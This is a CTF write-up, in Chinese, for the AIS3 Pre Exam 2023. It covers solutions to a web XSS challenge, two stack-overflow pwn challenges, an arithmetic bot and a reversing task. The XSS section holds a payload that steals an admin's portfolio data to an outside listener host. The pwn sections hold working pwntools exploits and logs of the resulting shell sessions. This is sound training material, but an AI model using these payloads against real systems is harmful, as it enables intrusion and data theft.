---
title: "AIS3 Pre Exam 2023 Writeup"
date: 2023-05-23T00:00:00+08:00
draft: false
github_link: "https://github.com/Jimmy01240397/CTF-writeup/tree/master/ais3-pre-exam-2023-writeup"
author: "Chumy"
tags:
  - CTF
image: /images/CTF.jpg
description: ""
toc: 
---

## Welcome
### 題目

![image](https://user-images.githubusercontent.com/57281249/239931158-52040d8d-3a45-495a-a298-20160a8da1bf.png)

### 解題
讀一下 [pdf](https://github.com/Jimmy01240397/CTF-writeup/blob/master/ais3-pre-exam-2023-writeup/Welcome/welcome.pdf)


## E-Portfolio baby
### 題目

![image](https://user-images.githubusercontent.com/57281249/239947968-58cebf9a-2d90-4e46-962c-708821270e0e.png)

### 解題
網頁進來是登入介面
![image](https://user-images.githubusercontent.com/57281249/239949795-ccaa3dcf-f7dd-486e-9ceb-ef88c53b4639.png)

About 那邊可以放 html 看起來可以 XSS
![image](https://user-images.githubusercontent.com/57281249/239949939-80bef056-5b2f-411e-9dee-ac420c3487e7.png)

測一下
![image](https://user-images.githubusercontent.com/57281249/239950346-3fe6900c-5d62-4690-9550-4aaaa7115e5c.png)

看起來可以
![image](https://user-images.githubusercontent.com/57281249/239950395-1559651a-26a4-4397-8bf6-c4c143e47259.png)

用 flask 隨便寫個 server 聽 request
``` python
#!/usr/bin/env python3

from flask import Flask,request,redirect,Response


app = Flask(__name__)

@app.route('/',methods=['GET'])
def data():
    print(request.args)
    return "aaa"


if __name__ == "__main__":
    app.run(host="0.0.0.0",port=80)
```

payload
``` html
<h5>Hello!</h5>
I am a <span style="color: red;">new</span> user.

<img src=x onerror='fetch("/api/portfolio").then(res => res.json()).then(data => {fetch(`http://10.113.193.20?${new URLSearchParams(data.data)}`)})'/>
```

送去給 admin
![image](https://user-images.githubusercontent.com/57281249/239951160-ce6aab2d-05dc-4a7a-a1bf-d611321778b6.png)

然後就收到 flag 了
![image](https://user-images.githubusercontent.com/57281249/239951318-cdb64a68-3280-4d77-89e7-068574d94b4f.png)

### Flag
`AIS3{<img src=x onerror='fetch(...}`

## ManagementSystem
### 題目

![image](https://user-images.githubusercontent.com/57281249/239945264-fe5fdba3-c448-4cb5-a992-c3e0e517a49e.png)

### 解題
1. IDA 打開
2. 人真好有給 shell code
![image](https://user-images.githubusercontent.com/57281249/239945579-c0bb2a2a-acb4-44a1-877d-45215b54d609.png)
3. 每個 user 的 function 找一遍後發現 `delete_user` 有用 gets，可以 stack overflow，先讓他跑到 `"Invalid index."` 感覺問題比較少。
![image](https://user-images.githubusercontent.com/57281249/239946309-5ab98d0b-aa5e-4a18-ae77-4e6f49c20f30.png)
4. 找 shell code 的位置
![image](https://user-images.githubusercontent.com/57281249/239947071-567d01ea-a12f-422b-86ce-5e64132ec7b9.png)
5. exploit
```python
import pwn
import re
import sys

r = pwn.remote('chals1.ais3.org', 10003)

print(r.recvrepeat(timeout=1).decode())
r.sendline(b'3')
print(r.recvrepeat(timeout=1).decode())
r.sendline(b'-1' + b'x'*(8*13-2) + int('40131B', 16).to_bytes(3, 'little'))

while True:
    print(r.recvrepeat(timeout=1).decode(), end='')
    print('> ', end='')
    r.send(input().encode())
#    r.send(sys.stdin.buffer.read())
```

```
chummy@hitcon:~/ais3preexam2023$ python3 mansysexp.py                                                                                                                                                    [11/294][+] Opening connection to chals1.ais3.org on port 10003: Done
Choose an option:
1. Add user
2. Show users
3. Delete user
4. Exit
>
Enter the index of the user you want to delete:
Invalid index.
Congratulations! You've successfully executed the secret function.
> ls
bin
boot
dev
etc
home
lib
lib32
lib64
libx32
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
> ls /home/chal
Makefile
flag.txt
ms
ms.c
run.sh
> cat /home/chal/flag.txt
FLAG{C0n6r47ul4710n5_0n_cr4ck1n6_7h15_pr09r4m_!!_!!_!}
> exit
>
>
[*] Closed connection to chals1.ais3.org port 10003
Traceback (most recent call last):
  File "/home/chummy/.local/lib/python3.9/site-packages/pwnlib/tubes/sock.py", line 65, in send_raw
    self.sock.sendall(data)
BrokenPipeError: [Errno 32] Broken pipe

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/home/chummy/ais3preexam2023/mansysexp.py", line 15, in <module>
    r.send(input().encode())
  File "/home/chummy/.local/lib/python3.9/site-packages/pwnlib/tubes/tube.py", line 778, in send
    self.send_raw(data)
  File "/home/chummy/.local/lib/python3.9/site-packages/pwnlib/tubes/sock.py", line 70, in send_raw
    raise EOFError
EOFError
```

### Flag
`FLAG{C0n6r47ul4710n5_0n_cr4ck1n6_7h15_pr09r4m_!!_!!_!}`

## Robot
### 題目

![image](https://user-images.githubusercontent.com/57281249/239931354-afd14468-755c-4429-93a4-720e96efa0ac.png)

### 解題
``` python
import pwn
import re

r = pwn.remote('chals1.ais3.org', 12348)

r.recvline()
r.recvline()

while True:
    now = r.recv(timeout=1)
    print(now.decode().strip())
    groups = re.match(b'\s*(\d*)\s*([^\s\d]*)\s*(\d*)', now)
    ans = b''
    if groups.group(2) in b'+-*/':
        ans = str(eval(f'{groups.group(1).decode()}{groups.group(2).decode()}{groups.group(3).decode()}')).encode()
        print(f'ans: {ans.decode()}')
        r.sendline(ans)
    else:
        print('bad')
```
```
chummy@hitcon:~/ais3preexam2023$ python3 robotexp.py                                                                                                                                                      [30/53][+] Opening connection to chals1.ais3.org on port 12348: Done
9  +  8
ans: 17
8+9
ans: 17
8        +        5
ans: 13
1  *  5
ans: 5
9 + 7
ans: 16
2 + 4
ans: 6
3  *  9
ans: 27
10+6
ans: 16
6  +  10
ans: 16
3 * 3
ans: 9
6*9
ans: 54
3 * 8
ans: 24
8*7
ans: 56
8 * 1
ans: 8
6    +    3
ans: 9
9     +     7
ans: 16
1*1
ans: 1
3     *     4
ans: 12
6 + 4
ans: 10
7     *     9
ans: 63
3     +     9
ans: 12
8  +  2
ans: 10
1+1
ans: 2
9     *     3
ans: 27
3  *  2
ans: 6
6*2
ans: 12
6+5
ans: 11
1+2
ans: 3
7  *  2
ans: 14
print('Segmentation fault (core dumped)'), exit(139)
bad
6  *  4
ans: 24
Congratulations! Flag: AIS3{don't_eval_unknown_code_or_pipe_curl_to_sh}
bad
Traceback (most recent call last):
  File "/home/chummy/ais3preexam2023/robotexp.py", line 10, in <module>
    now = r.recv(timeout=1)
  File "/home/chummy/.local/lib/python3.9/site-packages/pwnlib/tubes/tube.py", line 104, in recv
    return self._recv(numb, timeout) or b''
  File "/home/chummy/.local/lib/python3.9/site-packages/pwnlib/tubes/tube.py", line 174, in _recv
    if not self.buffer and not self._fillbuffer(timeout):
  File "/home/chummy/.local/lib/python3.9/site-packages/pwnlib/tubes/tube.py", line 153, in _fillbuffer
    data = self.recv_raw(self.buffer.get_fill_size())
  File "/home/chummy/.local/lib/python3.9/site-packages/pwnlib/tubes/sock.py", line 56, in recv_raw
    raise EOFError
EOFError
[*] Closed connection to chals1.ais3.org port 12348
```

### Flag
`AIS3{don't_eval_unknown_code_or_pipe_curl_to_sh}`

## SimplyPwn
### 題目

![image](https://user-images.githubusercontent.com/57281249/239932495-6a0bafff-9626-4400-80ff-eebe9e2ac101.png)

### 解題
1. IDA 打開
2. 人真好有給 shell code
![image](https://user-images.githubusercontent.com/57281249/239933559-f2a98b42-9d2a-4daa-8d46-ea66fac90097.png)
3. array 最長 64 bytes 然後 read 256 bytes 一臉就會 stack overflow.
![image](https://user-images.githubusercontent.com/57281249/239943925-86da7a51-43c9-4d25-abb2-970d7d4fceba.png)
4. 找 shell code 的位置
![image](https://user-images.githubusercontent.com/57281249/239944562-8c292e6c-fa5d-46c9-95dd-a81dbea6c5e5.png)
5. exploit
```python
import pwn
import re
import sys

r = pwn.remote('chals1.ais3.org', 11111)

print(r.recvrepeat(timeout=1).decode())
r.send(b'x'*(8*10-1) + int('4017A9', 16).to_bytes(3, 'little'))
r.recvrepeat(timeout=1)

while True:
    print(r.recvrepeat(timeout=1).decode(), end='')
    print('> ', end='')
    r.send(input().encode())
#    r.send(sys.stdin.buffer.read())
```

```
chummy@hitcon:~/ais3preexam2023$ python3 simpwnexp.py
[+] Opening connection to chals1.ais3.org on port 11111: Done
Show me your name:
> ls
FLAG
bin
boot
dev
etc
home
lib
lib32
lib64
libx32
media
mnt
opt
proc
root
run
runtime
sbin
srv
sys
tmp
usr
var
> cat FLAG
AIS3{5imP1e_Pwn_4_beGinn3rs!}
> exit
>
>
[*] Closed connection to chals1.ais3.org port 11111
Traceback (most recent call last):
  File "/home/chummy/.local/lib/python3.9/site-packages/pwnlib/tubes/sock.py", line 65, in send_raw
    self.sock.sendall(data)
BrokenPipeError: [Errno 32] Broken pipe

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/home/chummy/ais3preexam2023/simpwnexp.py", line 14, in <module>
    r.send(input().encode())
  File "/home/chummy/.local/lib/python3.9/site-packages/pwnlib/tubes/tube.py", line 778, in send
    self.send_raw(data)
  File "/home/chummy/.local/lib/python3.9/site-packages/pwnlib/tubes/sock.py", line 70, in send_raw
    raise EOFError
EOFError
```

### Flag
`AIS3{5imP1e_Pwn_4_beGinn3rs!}`

## Simply Reverse
### 題目

![image](https://user-images.githubusercontent.com/57281249/239952354-903f8815-c99c-414f-ada7-f5559bcd8636.png)

### 解題
1. IDA 打開
2. 讀 verify
![image](https://user-images.githubusercontent.com/57281249/239953043-467c41c6-7739-4d32-9c1f-723478da6244.png)
3. 看起來是把 encrypted 依照 index 做 rotation 就會得到 flag
4. 找 encrypted 的位置把 hex 複製下來
![image](https://user-images.githubusercontent.com/57281249/239955653-08e2130a-4c36-4935-94eb-f587269729c0.png)
5. 然後寫 code 算回來
``` python
import sys
def rotation(nowbyte, length):
    return (((nowbyte >> length) & 255) | ((nowbyte << (8 - length)) & 255)) & 255

enbytes = bytes.fromhex("8A5092C8063D5B95B6521B35825AEAF8942872DDD45DE329BA5852A8643581AC0A64")

ansbytes = []
for i in range(len(enbytes)):
    usebyte = enbytes[i] - 8
    if usebyte < 0:
        usebyte += 2**8
    ansbytes.append((rotation(usebyte, (i ^ 9) & 3) ^ i) & 255)

sys.stdout.buffer.write(bytes(ansbytes))
#print(bytes(ansbytes))
```

### Flag
`AIS3{0ld_Ch@1_R3V1_fr@m_AIS32016!}`

